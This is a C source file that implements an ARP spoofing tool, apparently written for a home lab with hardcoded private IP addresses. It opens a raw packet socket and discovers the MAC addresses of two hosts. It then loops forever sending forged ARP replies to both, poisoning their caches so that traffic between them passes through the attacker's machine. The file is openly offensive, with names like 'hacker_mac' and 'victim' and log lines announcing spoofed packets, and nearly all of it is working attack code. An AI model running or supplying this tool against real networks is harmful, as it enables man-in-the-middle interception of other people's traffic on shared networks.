# include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <net/ethernet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>

# define ETH_HDR_LEN 14
# define ARP_PKT_LEN 28
# define MAC_ADDRESS_LEN 6
# define IP_LENGTH 4

# define BROADCAST_ADDR (uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
# define PRINT_MAC_ADDRESS(X)   fprintf(stdout, \
                                        "%02X:%02X:%02X:%02X:%02X:%02X\n", \
                                        X[0],               \
                                        X[1],               \
                                        X[2],               \
                                        X[3],               \
                                        X[4],               \
                                        X[5]);
# define PRINT_IP_ADDRESS(X)    fprintf(stdout, \
                                        "%02d.%02d.%02d.%02d\n", \
                                        X[0],               \
                                        X[1],               \
                                        X[2],               \
                                        X[3]);



// Inspired by the <net/ethernet.h> header
typedef struct
{
    uint8_t destination_mac[MAC_ADDRESS_LEN];
    uint8_t source_mac[MAC_ADDRESS_LEN];
    uint16_t eth_type;
} Ethernet_Header;

typedef struct
{
    uint16_t hardware_type;
    uint16_t protocol_type;
    uint8_t hardware_len;
    uint8_t protocol_len;
    uint16_t opcode;
    uint8_t source_mac[MAC_ADDRESS_LEN];
    uint8_t source_ip[IP_LENGTH];
    uint8_t destination_mac[MAC_ADDRESS_LEN];
    uint8_t destination_ip[IP_LENGTH];
} ARP_Packet;

Ethernet_Header* create_ARP_Packet(const uint16_t opcode, const uint8_t *src_mac, const char *src_ip, const uint8_t *dest_mac, const char *dest_ip)
{
    /** Create an ARP packet */
    ARP_Packet  *arp_pkt;
    if (!(arp_pkt = malloc(sizeof(ARP_Packet))))
        return (NULL);

    arp_pkt->hardware_type = htons(1);
    arp_pkt->protocol_type = htons(ETH_P_IP);
    arp_pkt->hardware_len = MAC_ADDRESS_LEN;
    arp_pkt->protocol_len = IP_LENGTH;
    arp_pkt->opcode = htons(opcode);

    memcpy(&arp_pkt->source_mac, src_mac,
           sizeof(uint8_t) * MAC_ADDRESS_LEN);
    memcpy(&arp_pkt->destination_mac, dest_mac,
           sizeof(uint8_t) * MAC_ADDRESS_LEN);

    /* NOTE: See `man 3 inet_pton` */
    if (inet_pton(AF_INET, src_ip, arp_pkt->source_ip) != 1
        || inet_pton(AF_INET, dest_ip, arp_pkt->destination_ip) != 1)
        return (NULL);



    /** Now wrap the ARP packet in IP header */

    Ethernet_Header *eth_pkt;
    if (!(eth_pkt = malloc(sizeof(uint8_t) * IP_MAXPACKET)))
        return (NULL);

    memcpy(&eth_pkt->destination_mac, dest_mac,
           sizeof(uint8_t) * MAC_ADDRESS_LEN);
    memcpy(&eth_pkt->source_mac, src_mac,
           sizeof(uint8_t) * MAC_ADDRESS_LEN);

    /* NOTE: Simply doing `memcpy(&eth_pkt->eth_type,htons(ETHERTYPE_ARP),size)`
     * doesn't work. The two char bytes need to be separately placed in
     * the upper and lower bytes. */
    memcpy(&eth_pkt->eth_type, (uint8_t[2]) {
            htons(ETHERTYPE_ARP) & 0xff,
            htons(ETHERTYPE_ARP) >> 8
    }, sizeof(uint8_t)*2);

    memcpy((uint8_t *)eth_pkt + ETH_HDR_LEN, arp_pkt,
           sizeof(uint8_t) * ARP_PKT_LEN);

    return eth_pkt;
}

unsigned char *get_my_mac_address(const int sock, const char interface[const])
{
    struct ifreq ifr;
    char buf[1024];
    int success = 0;

    strcpy(ifr.ifr_name, interface);
    ioctl(sock, SIOCGIFHWADDR, &ifr);

    unsigned char *MAC = malloc(sizeof(unsigned char) * 6);
    memcpy(MAC, ifr.ifr_hwaddr.sa_data, 6);

    return MAC;
}

char get_index_from_interface(struct sockaddr_ll *device,
                              const char interface[const])
{
    if (device->sll_ifindex = if_nametoindex(interface)) {
        //fprintf(stdout, "[+] Got index '%d' from interface '%s'\n", device->sll_ifindex, interface);
        return 1;
    }

    fprintf(stderr, "[-] Could not get index from '%s'\n", interface);
    return 0;
}

char broadcast_packet(const int sd,
                      struct sockaddr_ll *device,
                      const uint8_t *hacker_mac,
                      const char *spoof_ip,
                      const char *victim_ip)
{
    Ethernet_Header* eth_pkt;

    /* NOTE: See <net/if_ether.h> for packet opcode */
    if (!(eth_pkt = create_ARP_Packet(ARPOP_REQUEST,
                                      hacker_mac, spoof_ip,
                                      BROADCAST_ADDR, victim_ip))) {
        fprintf(stderr,"ERROR: Socket creation failed\n");
        return 0;
    }
    //fprintf(stdout, "[+] ETHER packet created\n");

    if ((sendto(sd, eth_pkt, ARP_PKT_LEN + ETH_HDR_LEN, 0,
                (const struct sockaddr *)device, sizeof(*device))) <= 0) {
        fprintf(stderr,"ERROR: Could not send\n");
        return 0;
    }
    //fprintf(stdout, "[+] Packet sent to broadcast\n");

    return 1;
}

uint8_t *get_victim_mac(const int sd, const char *victim_ip)
{
    char buffer[IP_MAXPACKET];
    Ethernet_Header *eth_pkt;
    ARP_Packet *arp_pkt;
    uint8_t *victim_mac_address;
    char uint8_t_to_str[INET_ADDRSTRLEN] = {0};

    if (!(victim_mac_address = malloc(sizeof(uint8_t) * MAC_ADDRESS_LEN)))
        return (NULL);

    //fprintf(stdout, "[*] Listening for target response...\n");
    while (1)
    {
        if (recv(sd, buffer, IP_MAXPACKET, 0) <= 0) return (NULL);

        eth_pkt = (Ethernet_Header *)buffer;
        if (ntohs(eth_pkt->eth_type) != ETH_P_ARP)
            continue;

        arp_pkt = (ARP_Packet *)(buffer + ETH_HDR_LEN);

        if (ntohs(arp_pkt->opcode) == ARPOP_REPLY
            && (arp_pkt->source_ip != NULL &&
                inet_ntop(AF_INET, arp_pkt->source_ip,
                          uint8_t_to_str, INET_ADDRSTRLEN))
            && !strcmp(uint8_t_to_str, victim_ip)) {
            memset(uint8_t_to_str, 0, INET_ADDRSTRLEN);
            break;
        }
    }

    //fprintf(stdout, "[+] Got response from victim\n");
    fprintf(stdout, "[*] Sender MAC address: ");
    PRINT_MAC_ADDRESS(arp_pkt->source_mac);
    fprintf(stdout, "[*] Sender ip address: ");
    PRINT_IP_ADDRESS(arp_pkt->source_ip);
    fprintf(stdout, "[*] Target MAC address: ");
    PRINT_MAC_ADDRESS(arp_pkt->destination_mac);
    fprintf(stdout, "[*] Target ip address: ");
    PRINT_IP_ADDRESS(arp_pkt->destination_ip);

    memcpy(victim_mac_address, arp_pkt->source_mac,
           MAC_ADDRESS_LEN * sizeof(uint8_t));
    fprintf(stdout, "[*] Victim's MAC address: ");
    PRINT_MAC_ADDRESS(victim_mac_address);
    return (victim_mac_address);
}

void spoof_arp_packet(const int sd, struct sockaddr_ll *device,
               const uint8_t *hacker_mac,
               const char *host_ip_1, const uint8_t *host_mac_1,
               const char *host_ip_2, const uint8_t *host_mac_2)
{
    Ethernet_Header *ARP_Packet_1;
    Ethernet_Header *ARP_Packet_2;

    if (!(ARP_Packet_1 = create_ARP_Packet(ARPOP_REPLY,
                                           hacker_mac, host_ip_1,
                                           host_mac_2, host_ip_2))) {
        fprintf(stderr,"ERROR: ARP packet creation failed\n");
        return;
    }

    if (!(ARP_Packet_2 = create_ARP_Packet(ARPOP_REPLY,
                                           hacker_mac, host_ip_2,
                                           host_mac_1, host_ip_1))) {
        fprintf(stderr,"ERROR: ARP packet creation failed\n");
        return;
    }

    while (1) {
        if ((sendto(sd, ARP_Packet_1, ARP_PKT_LEN + ETH_HDR_LEN, 0,
                    (const struct sockaddr *)device, sizeof(*device))) <= 0) {
            fprintf(stderr,"ERROR: Could not send\n");
            return;
        }
        fprintf(stdout, "[+] SPOOFED Packet sent to '%s'\n", host_ip_2);
        sleep(5);

        if ((sendto(sd, ARP_Packet_2, ARP_PKT_LEN + ETH_HDR_LEN, 0,
                    (const struct sockaddr *)device, sizeof(*device))) <= 0) {
            fprintf(stderr,"ERROR: Could not send\n");
            return;
        }
        fprintf(stdout, "[+] SPOOFED Packet sent to '%s'\n", host_ip_1);
        sleep(5);
    }
}

int main(int argc, char *argv[])
{
    char *host_ip_1, *host_ip_2, *interface;
    unsigned char *hacker_mac = NULL;
    unsigned char *host_mac_1 = NULL;
    unsigned char *host_mac_2 = NULL;
    int sock;
    struct sockaddr_ll device;


    // spoof_ip = argv[1]; victim_ip = argv[2]; interface = argv[3];
    host_ip_1 = "192.168.0.175"; //server ip
    host_ip_2 = "192.168.0.144"; // macbook host ip
    interface = "enp0s3";


    if ((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
        fprintf(stderr,"ERROR: Socket creation failed\n");
        return EXIT_FAILURE;
    }

    if (!(hacker_mac = get_my_mac_address(sock, interface))) {
        fprintf(stderr,"ERROR: Could not get MAC address\n");
        return EXIT_FAILURE;
    }

    printf("[*] Attacker MAC address: ");
    PRINT_MAC_ADDRESS(hacker_mac);

    memset(&device, 0, sizeof device);
    if (!get_index_from_interface(&device, interface)) {
        exit(EXIT_FAILURE);
    }

    if (!broadcast_packet(sock, &device, hacker_mac,
                          host_ip_2, host_ip_1)) {
        exit(EXIT_FAILURE);
    }

    host_mac_1 = get_victim_mac(sock, host_ip_1);

    if (!broadcast_packet(sock, &device, hacker_mac,
                          host_ip_1, host_ip_2)) {
        exit(EXIT_FAILURE);
    }

    host_mac_2 = get_victim_mac(sock, host_ip_2);

    spoof_arp_packet(sock, &device, hacker_mac,
              host_ip_1, host_mac_1,
              host_ip_2, host_mac_2);

    if (hacker_mac != NULL) free(hacker_mac);
    close(sock);
    
    return 0;
}

